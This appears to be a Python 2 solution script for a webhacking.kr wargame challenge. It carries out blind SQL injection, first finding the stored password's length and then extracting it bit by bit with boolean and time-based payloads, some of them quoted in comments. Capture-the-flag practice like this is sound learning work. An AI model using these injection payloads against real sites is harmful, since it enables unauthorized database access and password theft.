# payload = 'substr(pw,1,1)in(0x42)'
#           '"SELECT * from users where username="natas18" and IF(length(password) = 1, sleep(10), false)#"'"
#           '"SELECT * from users where username="natas18" and IF(substr(lpad(bin(ord(substr(password,1,1))),8,0),1,1) = 0, sleep(10), false)#"'

import requests

url = "http://webhacking.kr/challenge/bonus/bonus-1/index.php"

r = requests.session()
headers = {"Cookie": "PHPSESSID="}
keyword = 'True'


def bin2dec(num):
    return int(str(num), 2)


def injection(payload, keyword):
    try:
        result = r.get(url, params=payload, headers=headers)
        # print result.content
        return keyword in result.content
    except Exception as e:
        print '**', e
        return e


def QueryLength():
    length = 1

    while True:
        payload = "no=2 and (length(pw)= " + str(length) + ") limit 0,1"
        # print payload
        if injection(payload, keyword):
            return length
            # break
        length += 1
        # print length
        # time.sleep(1)

    print 'Error. QueryLength Failed!'
    return -1


def QueryFlag():

    pw = ''
    length = QueryLength()
    print 'length: ', length

    for i in range(length):
        pw_bin = ''
        for digit in range(8):
            payload = 'no=2 and (substr(lpad(bin(ord(substr(pw,%d,1))),8,0),%d,1)=0) limit 0,1' % (
                i + 1, digit + 1)
            if injection(payload, keyword):
                pw_bin += '0'
            else:
                pw_bin += '1'
            print pw_bin
        pw += chr(bin2dec(pw_bin))
        print pw
        # time.sleep(1)

    return pw

if __name__ == "__main__":
    print QueryFlag()
